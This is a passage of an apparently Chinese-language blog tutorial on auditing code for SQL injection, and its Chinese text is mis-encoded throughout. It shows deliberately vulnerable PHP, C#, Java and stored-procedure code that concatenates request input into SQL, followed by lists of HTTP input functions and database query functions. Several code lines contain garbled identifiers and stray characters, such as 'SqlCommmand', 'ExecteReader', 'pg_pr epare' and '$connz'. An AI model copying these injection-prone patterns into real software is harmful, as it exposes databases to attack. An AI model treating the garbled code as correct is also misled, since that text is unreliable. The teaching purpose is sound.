href="#å°†æœªéªŒè¯çš„è¾“å…¥æ‹¼æ¥æˆSQLè¯­å¥å¹¶æ‰§è¡Œ" class="headerlink" title="å°†æœªéªŒè¯çš„è¾“å…¥æ‹¼æ¥æˆSQLè¯­å¥å¹¶æ‰§è¡Œ"></a>å°†æœªéªŒè¯çš„è¾“å…¥æ‹¼æ¥æˆSQLè¯­å¥å¹¶æ‰§è¡Œ</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//åœ¨PHPä¸­æ‰§è¡Œä¸€æ¡åŠ¨æ€æ„é€ çš„SQLè¯­å¥</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM table WHERE field = '<span class="token interpolation"><span class="token variable">$_GET</span></span>["</span>input"<span class="token punctuation">]</span>'<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">//åœ¨C#ä¸­æ‰§è¡Œä¸€æ¡åŠ¨æ€æ„é€ çš„SQLè¯­å¥SqlCommand command = new SqlCommmand("SELECT * FROM table WHERE field = '" + request.getParameter ("input") + "'" ,connection); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åœ¨Javaä¸­æ‰§è¡Œä¸€æ¡åŠ¨æ€æ„é€ çš„SQLè¯­å¥</span><span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM table WHERE field = '"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="å­˜å‚¨è¿‡ç¨‹ä¹Ÿä¼šæœ‰SQLæ³¨å…¥"><a href="#å­˜å‚¨è¿‡ç¨‹ä¹Ÿä¼šæœ‰SQLæ³¨å…¥" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹ä¹Ÿä¼šæœ‰SQLæ³¨å…¥"></a>å­˜å‚¨è¿‡ç¨‹ä¹Ÿä¼šæœ‰SQLæ³¨å…¥</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MS SQL Serverä¸­æ˜“å—æ”»å‡»çš„å­˜å‚¨è¿‡ç¨‹</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span><span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span><span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// MySQLä¸­æ˜“å—æ”»å‡»çš„å­˜å‚¨è¿‡ç¨‹</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">BEGIN</span><span class="token keyword">SET</span> <span class="token variable">@param</span> <span class="token operator">=</span> input<span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'SELECT field FROM table WHERE field='</span><span class="token punctuation">,</span><span class="token variable">@param</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> stmt <span class="token keyword">FROM</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token keyword">DEALLOCATE</span> <span class="token keyword">PREPARE</span> stmt<span class="token punctuation">;</span><span class="token keyword">End</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Oracleä¸­æ˜“å—æ”»å‡»çš„å­˜å‚¨è¿‡ç¨‹</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token punctuation">(</span>input <span class="token operator">IN</span> VARCHAR2<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">sql</span> VARCHAR2<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">sql</span> :<span class="token operator">=</span><span class="token string">'SELECT field FROM table WHERE field = '''</span> <span class="token operator">||</span> input <span class="token operator">||</span> <span class="token string">''''</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token keyword">sql</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//åœ¨PHPä¸­åŠ¨æ€åœ°æ‰§è¡ŒSQLå­˜å‚¨è¿‡ç¨‹</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select SP_StoredProcedure(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åœ¨C#ä¸­åŠ¨æ€åœ°æ‰§è¡ŒSQLå­˜å‚¨è¿‡ç¨‹</span>SqlCommand cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlCommand</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SP_StoredProceduren"</span><span class="token punctuation">,</span> conn<span class="token punctuation">)</span><span class="token punctuation">;</span>cmd<span class="token operator">.</span>CommandType <span class="token operator">=</span> CommandType<span class="token operator">.</span>StoredProcedure<span class="token punctuation">;</span>cmd<span class="token operator">.</span>Parameters<span class="token operator">.</span><span class="token function">Add</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SqlParameter</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"@input"</span><span class="token punctuation">,</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SqlDataReader rdr <span class="token operator">=</span> cmd<span class="token operator">.</span><span class="token function">ExecteReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨Javaä¸­åŠ¨æ€åœ°æ‰§è¡ŒSQLå­˜å‚¨è¿‡ç¨‹</span>CallableStatement cs <span class="token operator">=</span> con<span class="token operator">.</span><span class="token function">prepareCall</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"{call SP_StoredProcedure request.getParameter("</span>input<span class="token string double-quoted-string">")}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">string</span> output <span class="token operator">=</span> cs<span class="token operator">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="PHPä¸­HTTPå‡½æ•°"><a href="#PHPä¸­HTTPå‡½æ•°" class="headerlink" title="PHPä¸­HTTPå‡½æ•°"></a>PHPä¸­HTTPå‡½æ•°</h5><p>phpè¡¨å•æäº¤æœ‰ä¸¤ç§æ–¹å¼ï¼šGETã€POST</p><p>GETæ–¹å¼æ˜¾å¼æäº¤ï¼Œåœ°å€æ å¯ä»¥çœ‹åˆ°è¯·æ±‚å‚æ•°ï¼Œå¹¶ä¸”æœ‰å¤§å°é™åˆ¶</p><p><code>test.php?id=1&amp;num=2</code></p><p>POSTéšå¼æäº¤ï¼Œéœ€è¦æŠ“åŒ…æ‰èƒ½çœ‹åˆ°å‚æ•°ï¼Œæ²¡æœ‰å¤§å°é™åˆ¶</p><p><code>&amp;</code> <code>;</code>åˆ†å‰²å‚æ•°ï¼Œ<code>=</code>åˆ†å‰²å‚æ•°åç§°å’Œå€¼</p><p>ä¸€ç§ç‰¹æ®Šçš„å‚æ•°<code>cookie</code>é€šå¸¸ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šç”¨äºéªŒè¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_GET</span>ï¼šä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå­˜æ”¾é€šè¿‡<span class="token constant">HTTP</span> <span class="token constant">GET</span>æ–¹æ³•ä¼ é€’çš„å˜é‡ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_GET_VARS</span>ï¼šä¸<span class="token variable">$_GET</span>ç›¸åŒï¼Œåœ¨<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> ä¸­å·²å¼ƒç”¨ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_GET_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_POST</span>ï¼šä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå­˜æ”¾é€šè¿‡<span class="token constant">HTTP</span> <span class="token constant">POST</span>æ–¹æ³•ä¼ é€’çš„å˜é‡ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_POST_VARS</span>ï¼šä¸<span class="token variable">$_POST</span> ç›¸åŒï¼Œåœ¨<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> ä¸­å·²å¼ƒç”¨ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_POST_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_REQUEST</span>ï¼šä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«<span class="token variable">$_GET</span>ã€$ <span class="token constant">POST</span>å’Œ<span class="token variable">$_</span>ï¼ˆï¼š<span class="token number">001</span><span class="token operator">&lt;</span><span class="token operator">^</span>çš„å†…å®¹ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span>ï¼šä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå­˜æ”¾é€šè¿‡<span class="token constant">HTTP</span> cookieä¼ é€’ç»™å½“å‰è„šæœ¬çš„å˜é‡ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_COOKIE_VARS</span>ï¼šä¸<span class="token variable">$_COOKIE</span>ç›¸åŒï¼Œåœ¨<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> ä¸­å·²å¼ƒç”¨ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_COOKIE_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SERVER</span>ï¼šæœåŠ¡å™¨åŠæ‰§è¡Œç¯å¢ƒçš„ä¿¡æ¯ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$HTTP_SERVER_VARS</span>ï¼šä¸<span class="token variable">$_SERVER</span> ç›¸åŒï¼Œåœ¨<span class="token constant">PHP</span> <span class="token number">4.1</span><span class="token number">.0</span> ä¸­å·²å¼ƒç”¨ã€‚<span class="token variable">$var</span><span class="token operator">=</span><span class="token variable">$HTTP_SERVER_VARS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php.iniä¸­<code>register_globals=On</code>æ—¶ï¼Œå°†EGPCSï¼ˆEnvironmentã€GETã€POSTã€Cookieã€Serverï¼‰æ³¨å†Œæˆå…¨å±€å˜é‡ï¼Œå·²è¢«é—å¼ƒå¹¶ä¸”å¤„äºOffçŠ¶æ€ã€‚</p><h5 id="JAVAä¸­HTTPå‡½æ•°"><a href="#JAVAä¸­HTTPå‡½æ•°" class="headerlink" title="JAVAä¸­HTTPå‡½æ•°"></a>JAVAä¸­HTTPå‡½æ•°</h5><p>HTTPè¯·æ±‚å¯¹è±¡çš„ç±»åå’Œæ¥å£åç§°æ˜¯<code>HTTPServletRequest</code>,å¼•ç”¨æ˜¯å†™æˆ<code>javax.servlet.HttpServletRequest</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//getParameter()è¿”å›æ‰€è¯·æ±‚çš„ç»™å®šå‚æ•°çš„å€¼</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getParameterValues()ä»¥ä¸€ä¸ªæ•°ç»„çš„æ–¹å¼è¿”å›ç»™å®šå‚æ•°è¯·æ±‚çš„æ‰€æœ‰å€¼</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> string_array <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getQueryString()è¿”å›è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getHeaders()è¿”å›æ‰€è¯·æ±‚çš„å¤´çš„å€¼</span>sting string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getHeaders()ä»¥ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡çš„æšä¸¾è¿”å›è¯·æ±‚å¤´</span><span class="token class-name">Enumeration</span> enumeration_object <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getRequestedSessionld()è¿”å›å®¢æˆ·ç«¯æŒ‡å®šçš„ Session ID</span><span class="token class-name">String</span> string_variable <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestedSessionld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getCookies()è¿”å›ä¸€ä¸ªcookieå¯¹è±¡çš„æ•°ç»„</span><span class="token class-name">Cookie</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">Cookie_array</span> <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//cookie.getValue()è¿”å›æ‰€è¯·æ±‚çš„ç»™å®šcookieçš„å€¼</span><span class="token class-name">String</span> string_variale <span class="token operator">=</span> <span class="token class-name">Cookie_array</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="C-ä¸­HTTPå‡½æ•°"><a href="#C-ä¸­HTTPå‡½æ•°" class="headerlink" title="C#ä¸­HTTPå‡½æ•°"></a>C#ä¸­HTTPå‡½æ•°</h5><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//HttpCookieCollectionæ‰€æœ‰ cookie çš„é›†åˆHttpCookieCollection variable = Request.Cookies;//Formâ€•æ‰€æœ‰è¡¨å•å€¼çš„é›†åˆstring variable = Request.Form["name"];//Headersæ‰€æœ‰å¤´çš„é›†åˆstring variable = Request.Headers["name"];//Params æ‰€æœ‰æŸ¥è¯¢å­—ç¬¦ä¸²ã€è¡¨å•ã€cookieå’ŒæœåŠ¡å™¨å˜é‡çš„ç»„åˆé›†string variable = Request.Params["name"];//Querystringæ‰€æœ‰æŸ¥è¯¢å­—ç¬¦ä¸²é¡¹çš„é›†åˆstring variable = Request.Querystring["name"];//Servervariableæ‰€æœ‰WebæœåŠ¡å™¨å˜é‡çš„é›†åˆstring variable = Request.Servervariables["name"];//Urlè¿”å›ä¸€ä¸ªURIç±»å‹çš„å¯¹è±¡ï¼Œå…¶Queryå±æ€§åŒ…å«äº† URIä¸­çš„ä¿¡æ¯ï¼Œæ¯”å¦‚?foo=barUri object_variable = Request.Url;string variable = object_variable.Query;//UserAgentåŒ…å«æµè§ˆå™¨çš„ç”¨æˆ·ä»£ç†å¤´string variable = Request.UserAgent;//UserHostAddressåŒ…å«å®¢æˆ·ç«¯çš„è¿œç¨‹IPåœ°å€string variable = Request.UserHostAddress;//UserHostName å«å®¢æˆ·ç«¯çš„è¿œç¨‹ä¸»æœºåstring variable = Request.UserHostName;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å±é™©çš„å‡½æ•°"><a href="#å±é™©çš„å‡½æ•°" class="headerlink" title="å±é™©çš„å‡½æ•°"></a>å±é™©çš„å‡½æ•°</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//mssql_query ()å‘å½“å‰ä½¿ç”¨çš„æ•°æ®åº“å‘é€ä¸€ä¸ªæŸ¥è¯¢</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_query ()å‘å½“å‰ä½¿ç”¨çš„æ•°æ®åº“å‘é€ä¸€ä¸ªæŸ¥è¯¢</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_db_query ()é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ï¼Œåœ¨è¯¥æ•°æ®åº“ä¸Šæ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_db_query</span> <span class="token punctuation">(</span><span class="token variable">$dbf</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//oci_parse ()åœ¨è¯­å¥æ‰§è¡Œä¹‹å‰å¯¹å…¶è¿›è¡Œè§£æ</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">oci_parse</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ociexecute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ora_parse ()åœ¨è¯­å¥æ‰§è¡Œä¹‹å‰å¯¹å…¶è¿›è¡Œè§£æ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ora_parse</span><span class="token punctuation">(</span><span class="token variable">$cursorr</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token function">ora_exec</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//mssql_bind ()å‘å­˜å‚¨è¿‡ç¨‹æ·»åŠ ä¸€ä¸ªå‚æ•°</span><span class="token function">mssql_bind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stmt<span class="token punctuation">,</span> <span class="token number">1</span>@param<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token constant">SQLVARCHAR</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mssql_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//odbc_prepare ()å‡†å¤‡ä¸€æ¡æ‰§è¡Œè¯­å¥</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">odbc_prepare</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//odbc_ exec ()å‡†å¤‡å¹¶æ‰§è¡Œä¸€æ¡SQLè¯­å¥</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">odbc_exec</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_queryä¸€æ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢(æ›¾ç§°ä¸ºpg_exec)</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_execâ€”*Â¥å…¼å®¹æ€§åŸå› ä¾ç„¶å¯ç”¨ï¼Œä½†å»ºè®®ç”¨æˆ·ä½¿ç”¨æ–°çš„å‡½æ•°å</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_exec</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> <span class="token operator">/</span>pg_send_queryâ€”å‘é€â€”å¼‚æ­¥æŸ¥è¯¢ä¹™<span class="token function">pg_send_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_send_query_paramsä¸€å‘æœåŠ¡å™¨æäº¤ä¸€ä¸ªå‘½ä»¤å¹¶åˆ†ç¦»å‚æ•°ï¼Œæ— é¡»ç­‰å¾…ç»“æœ</span><span class="token function">pg_send_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token comment">//pg_query_paramsä¸€å‘æœåŠ¡å™¨æäº¤ä¸€ä¸ªå‘½ä»¤å¹¶ç­‰å¾…ç»“æœ</span><span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token comment">//pg_send_prepareä¸€å‘é€ä¸€ä¸ªè¯·æ±‚ä»¥åˆ›å»ºä¸€æ¡å…·æœ‰æŒ‡å®šå‚æ•°çš„é¢„å¤‡è¯­å¥ï¼Œæ— é¡»ç­‰å¾…å®Œæˆ</span>pg <span class="token function">send_prepare</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token operator">*</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_send_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_pr epareâ€”Sé€ä¸€ä¸ªè¯·æ±‚ä»¥åŠ„å»ºä¸€æ¡å…·æœ‰æŒ‡å®šå‚æ•°çš„é¢„å¤‡è¯­å¥å¹¶ç­‰å¾…å®Œæˆ</span><span class="token function">pg_prepare</span><span class="token punctuation">(</span><span class="token variable">$connz</span> <span class="token string double-quoted-string">"my_query"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> table <span class="token constant">WHERE</span> field <span class="token operator">=</span> <span class="token variable">$1</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pg_execute</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> nmy_query"<span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_selectä¸€æ ¹æ®æŒ‡å®šçš„å…·æœ‰field=&gt;valueçš„assoc_arrayé€‰æ‹©è®°å½•</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_select</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span class="token comment">//pg_update (Yâ€”ç”¨æ•°æ®æ›´æ–°ä¸æŒ‡å®šæ¡ä»¶_çš„è®°å½•</span><span class="token function">pg_update</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$arr_update</span><span class="token punctuation">,</span> <span class="token variable">$arr_where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pg_insert ()â€”å°† assoc_array çš„å€¼æ’å…¥åˆ° table_name æŒ‡å®šçš„è¡¨ä¸­</span><span class="token function">pg_insert</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span class="token comment">//pg_delete () ä¸€æ ¹æ®assoc_arrayä¸­æŒ‡å®šçš„é”®å’Œå€¼åˆ é™¤è¡¨ä¸­çš„è®°å½•</span><span class="token function">pg_delete</span><span class="token punctuation">(</span><span class="token variable">$connr</span> <span class="token variable">$table_name</span><span class="token punctuation">,</span> <span class="token variable">$assoc_array</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//createStatement 